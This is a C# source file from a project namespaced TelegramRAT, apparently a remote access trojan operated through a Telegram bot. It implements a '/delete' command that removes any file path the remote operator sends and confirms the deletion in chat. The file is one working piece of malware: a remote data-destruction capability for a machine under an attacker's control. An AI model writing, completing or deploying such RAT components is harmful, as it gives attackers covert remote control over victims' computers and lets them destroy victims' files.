using Telegram.Bot;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.File;

public class DeleteCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, IFileSystemService fileSystemService) : AbstractBotCommand
{
    public override string Command => "delete";
    public override string[] Aliases => new[] { "del" };
    public override string Description => "Delete file in path";
    public override string Example => "/delete hello world.txt";
    public override int ArgsCount => -2;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            var targetPath = fileSystemService.SanitizePath(model.Args.Length > 0 ? string.Join(' ', model.Args) : (model.RawArgs ?? string.Empty));

            if (fileSystemService.FileExists(targetPath))
            {
                fileSystemService.DeleteFile(targetPath);
                if (model.Message != null)
                {
                    await botClient.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                }
            }
            else
            {
                if (model.Message != null)
                {
                    await botClient.SendMessage(model.Message.Chat.Id, "This file does not exist.", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                }
            }
        }
        catch (Exception e)
        {
            if (model.Message != null)
            {
                await notificationService.ReportExceptionAsync(model.Message, e);
            }
        }
    }
}
